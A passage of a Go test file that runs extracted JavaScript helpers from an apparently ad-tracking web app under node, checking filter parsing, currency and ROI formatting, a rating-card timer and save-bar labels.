    if(op==='eq'&&vals.length>1) op='in'; if(op==='ne'&&vals.length>1) op='nin'; return {op, vals}; });
}
eq(condEscapeFilterValue('eq','C:\\tmp'), 'C:\\tmp', 'eq no escape in url');
eq(condEscapeFilterValue('in','a,b'), 'a\\,b', 'in escape comma');
eq(parseCondsFromQS(new URLSearchParams(condsQS([{f:'country',op:'in',v:['ru','us']}])))[0].vals, ['ru','us'], 'in qs round trip');
{const q=condsQS([{f:'site',op:'eq',v:['a,b']},{f:'site',op:'eq',v:['c']}]); eq(parseCondsFromQS(new URLSearchParams(q.toString()))[0].vals, ['a,b','c'], 'eq merge comma');}
{eq(parseCondsFromQS(new URLSearchParams('f='+encodeURIComponent('country:in:a\\,b,c')))[0].vals, ['a,b','c'], 'in escaped comma parse');}
{eq(parseCondsFromQS(new URLSearchParams('f='+encodeURIComponent('country:in:x\\\\,y')))[0].vals, ['x\\','y'], 'in backslash pair');}
{eq(parseCondsFromQS(new URLSearchParams('f='+encodeURIComponent('site:eq:C:\\tmp')))[0].vals, ['C:\\tmp'], 'eq path parse');}
{const row={op:'eq',v:[]}; fltCommit(row,'C:\\tmp'); eq(row.v, ['C:\\tmp'], 'ui eq backslashes');}
{const row={op:'in',v:[]}; fltCommit(row,'ru,us'); eq(row.v, ['ru','us'], 'in split typed list');}
{const row={op:'in',v:['a']}; fltCommit(row,' b, a '); eq(row.v, ['a','b'], 'in manual trim parts');}

const camp=fltCatalogItems('campaign',{groups:[{id:'42',name:'Demo'}]});
eq(fltCatalogItems('campaign',{groups:[{id:'99',name:''}]}).length, 0, 'nameless campaign omitted');
eq(camp[0].key, 'Demo', 'campaign key is group name');
eq(fltCatalogItems('origin_campaign',{groups:[{id:'7',name:'Orig'}]})[0].key, 'Orig', 'origin_campaign key is name');
eq(fltCatalogItems('campaign_id',{groups:[{id:'42',name:'Demo'}]})[0].key, '42', 'campaign_id key is id');
eq(fltCatalogItems('origin_campaign_id',{groups:[{id:'7',name:'Orig'}]})[0].key, '7', 'origin_campaign_id key is id');
eq(fltCatalogItems('landing_id',{landings:[{id:'L1',name:'Land'}]})[0].key, 'L1', 'landing_id key');
eq(fltCatalogItems('network_id',{networks:[{id:'N1',name:'Net'}]})[0].key, 'N1', 'network_id key');
eq(fltCatalogItems('source_id',{sources:[{id:'S1',name:'Src'}]})[0].key, 'S1', 'source_id key');
eq(fltCatalogItems('country',{countries:[{code:'pl'}]})[0].key, 'pl', 'country key lower');
eq(fltCatalogItems('device',{}).map(x=>x.key), ['phone','computer','tablet'], 'device presets');

eq(fltApplyDraft([{f:'campaign',op:'eq',v:['Away']}])[0].v, ['Away'], 'apply keeps strict without catalog');

{const inp={value:'Create \\"X\\"', dataset:{}}; groupInputSet(inp,'X'); eq(groupInputValue(inp), 'X', 'group key not caption');}
{const inp={value:'G1',dataset:{groupKey:'G1'}}; inp.value='G2'; comboClearStoredKeyOnEdit(inp,'groupKey'); eq(groupInputValue(inp), 'G2', 'group manual edit drops stale key');}
{const inp={value:'G1',dataset:{groupKey:'G1'}}; inp.value=''; comboClearStoredKeyOnEdit(inp,'groupKey'); eq(groupInputValue(inp), '', 'group clear empty');}
eq(comboKeyMatchesText('UTC · UTC+0', 'UTC', z=>'UTC · UTC+0'), true, 'combo label match');

// A saved id the select's catalog lacks is kept as an extra option, never dropped.
eq(unknownPick([{id:'2'},{id:'4'}], '51'), '51', 'unknown domain id is kept');
eq(unknownPick([{id:'2'},{id:'51'}], '51'), '', 'a listed id needs no extra option');
eq(unknownPick([{id:51}], '51'), '', 'a numeric catalog id equals the saved string');
eq(unknownPick([{id:'2'}], 51), '51', 'a numeric saved id is kept as text');
eq(unknownPick(['a','b'], 'b'), '', 'plain ids are compared too');
eq(unknownPick([{id:'2'}], ''), '', 'an empty value means no choice');
eq(unknownPick([{id:'2'}], null), '', 'a missing value means no choice');
eq(unknownPick([], '849'), '849', 'an empty catalog still keeps the id');
eq(unknownPick(null, '849'), '', 'an unloaded catalog adds nothing');
eq(unknownPick(undefined, '849'), '', 'an undefined catalog adds nothing');
eq(unknownPick([null,{id:'1'}], '1'), '', 'broken rows are skipped');

// When the header section button is shown.
eq(boardChromeVisible(null), false, 'no section state hides the button');
eq(boardChromeVisible({loaded:false, switchable:true, items:[{id:''},{id:'fin'}]}), false, 'hidden until the list is loaded');
eq(boardChromeVisible({loaded:true, switchable:false, items:[{id:''}]}), false, 'only the default section hides the button');
eq(boardChromeVisible({loaded:true, switchable:true, items:[{id:''}]}), false, 'a stale switchable flag with one row stays hidden');
eq(boardChromeVisible({loaded:true, switchable:true, items:[{id:'main'},{id:''}]}), false, 'two spellings of the default section are not a second section');
eq(boardChromeVisible({loaded:true, switchable:true, items:[{id:''},{id:'fin'}]}), true, 'one extra section shows the button');
eq(boardChromeVisible({loaded:true, switchable:true, items:[{id:'fin'},{id:'seo'}]}), true, 'two extra sections without the default one show the button');
eq(boardChromeVisible({loaded:true, switchable:false, items:[{id:'fin'}]}), false, 'a single extra section has nothing to switch to');
eq(boardChromeVisible({loaded:true, switchable:true, items:[null,{id:''}]}), false, 'broken rows are not sections');

// When the rating card is shown and what is stored for it.
{
  const owner = {user:'admin', type:'ADMIN'}, hour = RATE_LIMIT_MS;
  eq(RATE_LIMIT_MS, 3600000, 'the card waits for one hour of active time');
  eq(ratingOwner(owner), true, 'the main administrator has no users.json id');
  eq(ratingOwner({user:'bob', uid:'u1', type:'ADMIN'}), false, 'another administrator is not the main one');
  eq(ratingOwner({user:'ann', uid:'u2', type:'USER'}), false, 'a user is not the main administrator');
  eq(ratingOwner({user:'x', type:'USER'}), false, 'no id without the administrator type is not enough');
  eq(ratingOwner(null), false, 'no session');
  eq(ratingDue({active:hour}, 0, owner, hour), true, 'an hour of active time shows the card');
  eq(ratingDue({active:hour-1}, 0, owner, hour), false, 'one millisecond short');
  eq(ratingDue({active:hour-60000}, hour, owner, hour), true, 'time the tabs counted but did not write yet counts');
  eq(ratingDue({active:hour}, 1000, owner, hour), true, 'a smaller shared value does not lower the stored one');
  eq(ratingDue(undefined, hour, owner, hour), true, 'a first count without a stored state');
  eq(ratingDue({active:hour, closed:true}, 0, owner, hour), false, 'a closed card never comes back');
  eq(ratingDue({active:hour, score:4}, 0, owner, hour), false, 'a rated card never comes back');
  eq(ratingDue({active:hour*5}, 0, {user:'bob', uid:'u1', type:'ADMIN'}, hour), false, 'only the main administrator is asked');
  eq(ratingDue({active:hour}, -hour, owner, hour), true, 'a negative shared time is ignored');
  eq(ratingTabActive('visible', true), true, 'a shown tab in focus counts');
  eq(ratingTabActive('visible', false), false, 'a shown tab out of focus does not count');
  eq(ratingTabActive('hidden', true), false, 'a hidden tab does not count');
  eq(ratingStep(15000, ratingTabActive('visible', true), 1000), 15000, 'the tab in focus with recent input counts');
  eq(ratingStep(15000, ratingTabActive('visible', false), 1000), 0, 'a background window adds nothing');
  eq(ratingStep(15000, false, 1000), 0, 'a hidden tab does not count');
  eq(ratingTotal(60000, 0, 15000), 75000, 'the step grows the stored time');
  eq(ratingTotal(60000, 120000, 15000), 135000, 'the larger shared time of another tab wins');
  eq(ratingTotal(120000, 60000, 15000), 135000, 'a stale shared time does not lower the stored one');
  eq(ratingTotal('x', -5, 15000), 15000, 'bad values count as zero');
  eq(ratingTotal(60000, 60000, 0), 60000, 'no step keeps the time');
  eq(ratingStep(15000, true, RATE_IDLE_MS+1), 0, 'more than five minutes without input does not count');
  eq(ratingStep(15000, true, RATE_IDLE_MS), 15000, 'exactly five minutes still counts');
  eq(ratingStep(3600000, true, 0), RATE_STEP_MAX, 'a computer that slept adds one step only');
  eq(ratingStep(-5000, true, 0), 0, 'a clock that went back adds nothing');
  eq(pageViewRating({active:'12.7', closed:'yes', score:9, at:'x'}), {active:12, closed:false, score:0, at:''}, 'bad values are dropped');
  eq(pageViewRating({active:-1, score:3, at:'2026-11-16T12:00:00Z', closed:true}), {active:0, closed:true, score:3, at:'2026-11-16T12:00:00Z'}, 'a score with its time');
  eq(pageViewRating({score:2.5}).score, 0, 'a score is a whole star');
  const def = defaultPageViewState();
  eq('rating' in collectPageViews(def), false, 'nothing counted means no rating key');
  const st = applyPageViews({rating:{active:120000, closed:false, score:0, at:''}}, def);
  eq(collectPageViews(st).rating, {active:120000, closed:false, score:0, at:''}, 'rating round trip');
  eq(applyPageViews({rating:'x'}, def).rating, undefined, 'a rating that is not an object is ignored');
}

if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
`

func TestTzInputLogic(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found")
	}
	html := spaSource()
	var b strings.Builder
	for _, name := range []string{"comboKeyMatchesText", "comboClearStoredKeyOnEdit", "tzInputSet", "tzInputValue", "tzInputValidate"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn)
		b.WriteByte('\n')
	}
	b.WriteString(`
function tzCanon(z){ return z; }
function tzLabel(z){ if(!z) return ''; return z==='UTC'?'UTC · UTC+0':z+' · UTC+1'; }
function tzOptions(){ return ['UTC','Europe/Kyiv']; }
function tr(k){ return k; }
let failed=0;
const eq=(got,want,what)=>{ if(JSON.stringify(got)!==JSON.stringify(want)){ failed++; console.log('FAIL '+what+' got '+JSON.stringify(got)+' want '+JSON.stringify(want)); } };
const inp={value:'',dataset:{}};
tzInputSet(inp,'UTC');
eq(tzInputValue(inp),'UTC','tz pick stores key');
inp.value='Mars/Base';
comboClearStoredKeyOnEdit(inp,'tzKey',tzLabel);
eq(tzInputValue(inp),'','tz manual junk clears stale key');
inp.value='Europe/Kyiv · UTC+1';
eq(tzInputValue(inp),'Europe/Kyiv','tz label resolves');
let err='';
try{ tzInputValidate({value:'Mars/Base',dataset:{}}); }catch(e){ err=e.message; }
eq(err,'err.spend.zone','tz validate rejects unknown');
if(failed){ process.exit(1); }
`)
	f := filepath.Join(t.TempDir(), "tz-input.js")
	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("tz input checks failed:\n%s", out)
	}
}

func TestSortableHeadPostback(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found")
	}
	html := spaSource()
	var b strings.Builder
	for _, name := range []string{"asSortMeta", "ariaSortAttr", "sortableHead"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn)
		b.WriteByte('\n')
	}
	b.WriteString(`
function tr(k){ return k; }
function esc(s){ return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;'); }
function loadCols(){ return []; }
const pbMeta={text:new Set(['subid','status','outcome','direction']), date:new Set(['ts']), field:(id)=>id};
const head=sortableHead('pblog', {k:'ts',dir:-1}, [{id:'ts',label:'Time',on:1},{id:'payout',label:'off.payout',on:1}], pbMeta);
if(!head.includes('data-sort="ts"')||!head.includes('data-sort="payout"')){ console.log('FAIL missing sort buttons', head); process.exit(1); }
if(!head.includes('aria-sort="descending"')||!head.includes('aria-sort="none"')){ console.log('FAIL missing aria-sort', head); process.exit(1); }
`)
	f := filepath.Join(t.TempDir(), "sort-head.js")
	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("sortableHead postback check failed:\n%s", out)
	}
}

// TestMoneyDisplay runs the SPA currency helpers under node and checks the
// labels: an empty currency code is USD, a zero key is not a second currency,
// ROI without spend is 0.00%, and two nonzero currencies stay a code list. It skips when node is absent.
// The uitest tag keeps this off the default go test, which does not need node.
func TestMoneyDisplay(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping money display checks")
	}
	html := spaSource()
	var b strings.Builder
	for _, name := range []string{"curKey", "curSign", "moneyUnits", "moneyText", "csvMoney", "plainMoney", "cellRatio", "normBy", "moneyMap", "costCode", "costCodesList", "spendBasis", "profitList", "roiPct", "metricROI", "roiCls", "cpcCell", "cpcHasSpend", "moneyCellCls", "moneyOf", "profitOf", "clickCostBy", "addBy", "pct", "periodSpendBy", "campaignCostOnly", "spendShare", "overlapShare", "rangeBounds", "sumClicks", "foldStatus", "packMetrics", "factsIndex", "campaignMetrics", "pointSpendBy", "pointMoney", "nameSortKey", "nameCollator", "nameIconRank", "nameScript", "nameKey", "compareNameKeys", "asSortMeta", "applySort", "fltOpMulti", "fltCommit", "logSortField", "reportCellText", "reportHasCost"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn)
		b.WriteByte('\n')
	}
	b.WriteString(moneyDisplayChecks)
	f := filepath.Join(t.TempDir(), "money.js")
	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("money display checks failed:\n%s", out)
	}
}

const moneyDisplayChecks = `
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
eq(costCode({EUR:0, GBP:100}).code, 'GBP', 'zero key is not a second currency');
eq(costCode({EUR:0, GBP:100}).multi, false, 'one nonzero amount');
eq(costCode({EUR:0}).code, 'EUR', 'a lone zero key keeps EUR');
eq(costCode({}).code, '', 'no keys');
var FACTS={ready:true,clicks:[{group_id:'g1',offer_id:'o1',network_id:'n1',stream:'s',hits:2,uniq:1,cost_cents:150,cost_cur:'USD'},{group_id:'g2',offer_id:'o1',network_id:'n1',stream:'s',hits:1,uniq:1,cost_cents:0,cost_cur:''}],status:[]};
var SPEND=[];
rangeBounds=function(){return {from:new Date('2020-01-01T00:00:00Z'),to:new Date('2030-01-01T00:00:00Z')}};
eq(metricROI(12.34, {}, true), '0.00%', 'revenue and no spend');
eq(metricROI(12.34, {EUR:100, USD:100}, true), 'EUR · USD', 'two currencies list codes');
eq(moneyOf(12.34, {EUR:100, USD:100}, true, 2), '12.34 $', 'multi revenue is in dollars');
eq(profitOf(12.34, {EUR:100, USD:100}, true), '12.34 $ · -1.00 EUR · -1.00 $', 'multi profit lists spend');
eq(moneyOf(12.34, {EUR:0, GBP:100}, true, 2), '12.34 $', 'revenue is USD whatever the spend currency');
eq(moneyMap({EUR:0, GBP:100}, 2), '0.00 EUR · 1.00 GBP', 'zero keys stay in the spend list');
eq(moneyOf(0, {EUR:100}, false, 2), '0.00 $', 'unready revenue is zero dollars');
eq(cpcCell({hits:0, costBy:{EUR:100}}), '0.00 EUR', 'zero clicks show zero in the spend currency');
eq(cpcCell({hits:4, costBy:{}}), '0.00 $', 'CPC without spend is zero dollars');
eq(pct(0,0), '0.0%', 'pct zero base');
eq(cellRatio(0,0), '0.00%', 'cellRatio zero base');
eq(roiCls('12.50%'), 'ok', 'roiCls positive');
eq(roiCls('-3.00%'), 'bad', 'roiCls negative');
eq(roiCls('0.00%'), '', 'roiCls zero');
eq(roiCls('EUR'), '', 'roiCls currency list');
eq(moneyText(42814.27,'USD'), '42,814.27 $', 'moneyText USD groups thousands');
eq(moneyText(1234.5,'eur'), '1,234.50 EUR', 'moneyText other code');
eq(moneyText(10,''), '10.00 $', 'an empty code is USD');
eq(moneyText('x','USD'), '0.00 $', 'moneyText non-number');
eq(moneyText(-120.5,'USD'), '-120.50 $', 'a minus stays in front');
eq(moneyText(-0.001,'USD'), '0.00 $', 'a rounded zero has no minus');
eq(moneyText(NaN), '0.00 $', 'NaN is zero dollars');
eq(moneyText(null,'', 3), '0.000 $', 'digits are kept');
eq(plainMoney('1,234,567.89 $ · 1,000.00 EUR'), '1234567.89 $ · 1000.00 EUR', 'plainMoney strips grouping');
eq(plainMoney('12.50%'), '12.50%', 'plainMoney leaves percents');
eq(moneyText(1, '', 2), '1.00 $', 'no currency at all is dollars');
eq(moneyText(1, '', 2), moneyText(1, 'usd', 2), 'the letter case of the code does not matter');
eq(moneyText(1, 'USD', 2), '1.00 $', 'USD is dollars');
eq(clickCostBy(), {USD:150}, 'click prices sum by currency');
eq(clickCostBy(function(r){return r.group_id==='g2'}), {}, 'zero cents add no key');
eq(moneyMap({'':300}, 2), '3.00 $', 'empty currency is dollars');
eq(moneyMap({}), '0.00 $', 'no spend is zero dollars');
eq(moneyMap({USD:100,'':200}), '3.00 $', 'empty and USD are one currency');
eq(moneyMap({USD:100,EUR:100}), '1.00 $ · 1.00 EUR', 'several currencies are a list');
eq(costCode({'':300}).code, 'USD', 'empty bucket is USD');
eq(costCode({USD:100,'':200}), {code:'USD',amount:3,multi:false}, 'empty and USD add up');
eq(costCode({'':300}).multi, false, 'empty bucket is not multi');
eq(metricROI(6, {'':300}, true), '100.00%', 'roi of one empty bucket');
eq(metricROI(6, {USD:100,'':200}, true), '100.00%', 'roi of USD and empty is one currency');
eq(campaignCostOnly('g1'), {USD:150}, 'campaign click price');
eq(periodSpendBy(), {USD:150}, 'period click price');
const keptClicks=FACTS.clicks;
FACTS.clicks=[{group_id:'g3',hits:1,cost_cents:300,cost_cur:''}];
eq(clickCostBy(), {USD:300}, 'a click without a code is USD');
eq(addBy({USD:100}, {'':50}), {USD:150}, 'addBy merges an empty code into USD');
FACTS.clicks=keptClicks;
SPEND=[{group_id:'g1',currency:'USD',cents:100,from:'2020-01-01',to:'2020-02-01'}];
spendShare=function(){return 1};
eq(campaignCostOnly('g1'), {USD:250}, 'manual window plus click price');
eq(pct(1,0), '0.0%', 'pct zero base when numerator set');
eq(roiPct(100,0), 0, 'roi no cost');
eq(moneyOf(5, {}, true), '5.00 $', 'revenue without spend is dollars');
eq(moneyOf(5, {}, false), '0.00 $', 'unready revenue is zero dollars');
eq(moneyOf(1.5, {USD:300}, true, 2, true), '1.50 $', 'EPC keeps two digits');
eq(profitOf(1, {USD:300}, true), '-2.00 $', 'a loss keeps its minus');
eq(profitOf(12.34, {EUR:100, USD:100}, true), '12.34 $ · -1.00 EUR · -1.00 $', 'several currencies: revenue then spend');

// Revenue is always USD; spend in another currency is never subtracted from it.
eq(moneyOf(12.34, {EUR:100}, true), '12.34 $', 'EUR spend: revenue in dollars');
eq(moneyOf(2, {EUR:100}, true, 2), '2.00 $', 'EUR spend: EPC in dollars');
eq(profitOf(12.34, {EUR:100}, true), '12.34 $ · -1.00 EUR', 'EUR spend: profit is a list');
eq(profitOf(12.34, {EUR:0}, true), '12.34 $', 'a zero EUR key is no spend');
eq(profitOf(12.34, {EUR:100}, false), '0.00 $', 'unready profit is zero dollars');
eq(profitOf(10, {USD:300}, true), '7.00 $', 'USD spend is subtracted');
eq(profitOf(10, {'':300}, true), '7.00 $', 'an empty code is USD');
eq(metricROI(6, {EUR:300}, true), 'EUR', 'EUR spend: ROI is not computed against dollars');
eq(metricROI(6, {USD:300}, true), '100.00%', 'USD spend: ROI as before');
eq(spendBasis({EUR:100}), {mixed:true, amount:0}, 'EUR spend is mixed');
eq(spendBasis({USD:300,'':100}), {mixed:false, amount:4}, 'USD and empty add up');
eq(spendBasis({}), {mixed:false, amount:0}, 'no spend');
eq(profitList(5, {EUR:250,GBP:0}, 2), '5.00 $ · -2.50 EUR', 'list skips zero spend');
eq(cpcCell({hits:4, costBy:{EUR:400}}), '1.00 EUR', 'CPC stays in the currency of the spend');
FACTS={ready:true,clicks:[{group_id:'gE',hits:2,uniq:1,cost_cents:200,cost_cur:'EUR'}],status:[{group_id:'gE',status:'sale',n:1,profit:10}]};
const mE=campaignMetrics('gE');
eq([mE.rev, mE.profit, mE.multi, mE.costAmt], [10,10,true,0], 'EUR spend: profit is not revenue less euros');
eq(profitOf(5, {}, true), '5.00 $', 'profit without spend');
eq(cpcCell({hits:4, costBy:{'':400}}), '1.00 $', 'CPC of an empty code is dollars');
eq(cpcCell({hits:4, costBy:{USD:400,EUR:100}}), 'USD · EUR', 'CPC of two currencies lists codes');
eq(costCodesList({'':100,EUR:100}), 'USD · EUR', 'code list names an empty code USD');
eq([csvMoney(1234.5), csvMoney(-0.001), csvMoney('x'), csvMoney(1e6)], ['1234.50','0.00','0.00','1000000.00'], 'CSV amounts are plain numbers');
eq(plainMoney(moneyText(1234567.891,'EUR')), '1234567.89 EUR', 'CSV text without grouping');
for (const [n, want] of [[0.005,'0.01'],[1.005,'1.01'],[-0.005,'-0.01'],[-1.005,'-1.01'],[2.675,'2.68'],[0.004,'0.00'],[-0.004,'0.00'],[1e-7,'0.00'],[1234.5,'1234.50']]) {
  eq(csvMoney(n), want, 'csvMoney rounds '+n+' through whole cents');
  eq(moneyText(n,'USD',2).replace(/,/g,'').replace(' $',''), want, 'moneyText and csvMoney agree on '+n);
}
eq([moneyUnits(1.005,2), moneyUnits(-0.005,2), moneyUnits(-0.004,2), moneyUnits('x',2), moneyUnits(1.0005,3)], [101,-1,0,0,1001], 'moneyUnits gives whole minor units, halves away from zero, never -0');
eq(Object.is(moneyUnits(-0.001,2), 0), true, 'moneyUnits has no negative zero');

// Unique visitors of a campaign: one visitor counts once, not once per landing and offer.
const uClicks=[{group_id:'g9',stream:'s',landing_id:'l',hits:1,uniq:1,uniq_first:1},{group_id:'g9',stream:'s',offer_id:'o',hits:1,uniq:1,uniq_first:0}];
eq([sumClicks(uClicks,true).uniq, sumClicks(uClicks).uniq, sumClicks(uClicks).hits], [1,2,2], 'uniq_first counts the visitor once; plain uniq stays for offers and networks');
eq(sumClicks([{hits:1,uniq:1}],true).uniq, 1, 'a row without uniq_first counts uniq');
FACTS={ready:true,clicks:uClicks,status:[]};
eq(campaignMetrics('g9').uniq, 1, 'a campaign counts uniq_first');

// A chart point carries its own spend whatever the currency, so the tooltip need not borrow the period.
const day0=Date.parse('2026-10-01T00:00:00Z'), day1=Date.parse('2026-10-02T00:00:00Z'), day2=Date.parse('2026-10-03T00:00:00Z');
const eurRow={currency:'EUR',cents:1000,from:'2026-10-01T00:00:00Z',to:'2026-10-03T00:00:00Z'};
eq(pointSpendBy([eurRow], null, day0, day1), {EUR:500}, 'a manual window splits over the points it covers');
eq(pointSpendBy([eurRow], {USD:100}, day0, day1), {EUR:500,USD:100}, 'the click price joins the spend of the point');
eq(pointSpendBy([eurRow], {'':100}, day2, day2+86400000), {USD:100}, 'a point outside the window has only its click price');
eq(pointSpendBy(null, null, day0, day1), {}, 'no spend at all');
eq(pointSpendBy([{currency:'',cents:300,from:'2026-10-01T00:00:00Z',to:'2026-10-02T00:00:00Z'}], null, day0, day1), {USD:300}, 'an empty code is dollars');
eq(pointMoney({revenue:10,costBy:{EUR:500,USD:100}}, false, '', true), {cost:'5.00 EUR · 1.00 $', profit:'10.00 $ · -5.00 EUR · -1.00 $', roi:'EUR · USD'}, 'mixed spend: cost, profit and ROI of the point');
eq(pointMoney({revenue:10,costBy:{EUR:500}}, false, '', false), {cost:'5.00 EUR', profit:'0.00 $ · -5.00 EUR', roi:'0.00%'}, 'unready revenue is zero dollars');
eq(pointMoney({revenue:10,costBy:{}}, false, '', true), {cost:'0.00 $', profit:'10.00 $', roi:'0.00%'}, 'a point without spend');
eq(pointMoney({revenue:10}, false, '', true).cost, '0.00 $', 'a point without a spend map is a point without spend');
eq(pointMoney({cost:2,profit:8,costBy:{USD:200}}, true, 'USD', true), {cost:'2.00 $', profit:'8.00 $', roi:null}, 'dollar spend keeps the point cost and profit');
eq(pointMoney({}, true, 'USD', true), {cost:'0.00 $', profit:'0.00 $', roi:null}, 'dollar spend without numbers is zero');

eq(fltCommit({op:'eq',v:[]}, ' a, b '), true, 'fltCommit eq');
{const row={op:'eq',v:[]}; fltCommit(row,' a, b '); eq(row.v, ['a, b'], 'eq keeps comma pair');}
{const row={op:'in',v:['a']}; eq(fltCommit(row,' b, a '), true, 'fltCommit in'); eq(row.v, ['a','b'], 'in dedupe');}
eq(fltCommit({op:'in',v:[]}, '   '), false, 'fltCommit blank');
eq(fltCommit(null,'x'), false, 'fltCommit no row');

const evFields=[{name:'ts'},{name:'ip'},{name:'campaign'}];
eq(logSortField('events','ts',evFields), 'ts', 'logSortField ts');
eq(logSortField('events','osbrowser',evFields), '', 'logSortField osbrowser');
eq(logSortField('events','offer_num',evFields), '', 'logSortField offer_num');
eq(logSortField('events','missing',evFields), '', 'logSortField unknown');

const d1={t:'2026-01-01T00:00:00Z', n:2, name:'⚡️ A'};
const d2={t:'2026-06-01T00:00:00Z', n:1, name:'❌ B'};
eq(applySort([d1,d2], {k:'t',dir:-1}, (r,k)=>r[k], {date:['t']}).map(x=>x.t), [d2.t,d1.t], 'applySort date desc');
eq(applySort([d1,d2], {k:'n',dir:-1}, (r,k)=>r[k], {text:[]}).map(x=>x.n), [2,1], 'applySort number desc');
const nm=applySort([{name:'⚡️ 711 Casino'},{name:'❌ SpinDog'},{name:'All Offers'}], {k:'name',dir:1}, (r,k)=>r[k], {name:['name']}).map(x=>x.name);
eq(nm[0], 'All Offers', 'applySort name asc skips emoji rank');

eq(moneyCellCls('rev', {amount: 0, ready: true}), '', 'zero revenue has no tone class');
eq(moneyCellCls('rev', {amount: 12, ready: true}), 'c-rev', 'nonzero revenue has c-rev');
eq(moneyCellCls('cost', {costBy: {}}), '', 'empty spend map has no cost class');
eq(moneyCellCls('cost', {costBy: {USD: 100}}), 'c-cost', 'nonzero spend has c-cost');

eq(reportHasCost([{hits: 1}, {hits: 2, cost: {'': 0}}]), false, 'report rows without a positive cost have no cost column');
eq(reportHasCost([{hits: 1}, {hits: 2, cost: {'': 150}}]), true, 'one priced report row shows the cost column');
eq(reportCellText({cost: {'': 150}}, 'cost', false), moneyText(1.5, 'USD', 2), 'a report cost without a code is USD');
eq(reportCellText({cost: {'': 150}}, 'cost', true), '1.50', 'a CSV cost of one currency is a plain number');
eq(reportCellText({cost: {USD: 150, EUR: 40}}, 'cost', true), moneyMap({USD: 150, EUR: 40}), 'a CSV cost in two currencies lists them');
eq(reportCellText({}, 'cost', false), moneyText(0, 'USD', 2), 'a row without cost shows zero');
if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
`

// saveBarEntryChecks are the assertions of TestSaveBarEntries: the save bar names campaigns by
// number and name; the route is the slug, never the number.
const saveBarEntryChecks = `
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
eq(dirtyEntries([{id:'promo',num:12,name:'Spring'}]), [{kind:'flow',ref:'12',name:'Spring',route:'flows/promo'}], 'campaign item: number, name, slug route');
eq(dirtyEntries([{id:'promo',num:12,name:''}])[0].name, 'promo', 'nameless campaign shows its slug');
eq(dirtyEntries([{id:'promo',name:' x '}]), [{kind:'flow',ref:'promo',name:'x',route:'flows/promo'}], 'no number: the slug is the reference');
eq(dirtyEntries([{id:'a b/c',num:3}])[0].route, 'flows/a%20b%2Fc', 'slug is escaped in the route');
eq(dirtyEntries([{id:'',num:3}])[0].route, '', 'no slug, nowhere to go');
eq(dirtyEntries([{id:'7',num:3}])[0].route, 'flows/7', 'the route carries the slug even when it looks like a number');
{const g={id:'x',num:1}; eq(dirtyEntries([g],{draft:g}).length, 1, 'a draft owner already listed is not repeated');}
eq(dirtyEntries([],{draft:{id:'d',num:2}})[0].ref, '2', 'a campaign with an unsaved list file is listed');
eq(dirtyEntries([null,'x',{id:'a',num:1}]).length, 1, 'non-objects are skipped');
eq(dirtyEntries([{id:'a',num:1}],{removed:2,automation:true}).map(e=>e.kind), ['flow','removed','automation'], 'removed and automation items follow');
eq(dirtyEntries([{id:'a',num:1}],{automation:true})[1].route, 'automation', 'automation opens its page');
eq(dirtyEntries([],{removed:0}), [], 'nothing changed, nothing listed');
eq(dirtyLabel({ref:'12',name:'Spring'}), '#12 Spring', 'label: #number name');
eq(dirtyLabel({ref:'12',name:''}), '#12', 'label without a name');
eq(dirtyLabel(null), '', 'label of nothing');

if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
`

// TestSaveBarEntries runs dirtyEntries and dirtyLabel under node: which items the save bar lists
// and how a campaign is labelled and routed. It skips when node is absent.
func TestSaveBarEntries(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the save bar entry checks")
	}
	html := spaSource()
	var b strings.Builder
	for _, name := range []string{"dirtyEntries", "dirtyLabel"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn)
		b.WriteByte('\n')
	}
	b.WriteString(saveBarEntryChecks)
	f := filepath.Join(t.TempDir(), "savebar-entries.js")
	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("save bar entry checks failed:\n%s", out)
	}
}

// TestDchipRun checks that a save-bar chip scrolls only when its label is wider than the chip,
// and that the label stays left-aligned. t is the test handle. It returns nothing.
func TestDchipRun(t *testing.T) {
	html := spaSource()
	chip := spaBetween(html, ".savebar .dchip{", "}")
	must(t, chip, "text-align:left", "chip text starts at the left")
	must(t, chip, "justify-content:flex-start", "chip content starts at the left")
	mustNot(t, chip, "text-overflow:ellipsis", "the type word is not cut by an ellipsis")
	must(t, html, ".savebar .dchip[data-run]:hover .dchip-t", "hover scrolls only a marked chip")
	must(t, html, ".savebar .dchip[data-run]:focus-visible .dchip-t", "keyboard focus scrolls like hover")
	must(t, html, "@media (prefers-reduced-motion:reduce){\n    .savebar .dchip[data-run]:hover .dchip-t", "reduced motion does not scroll")
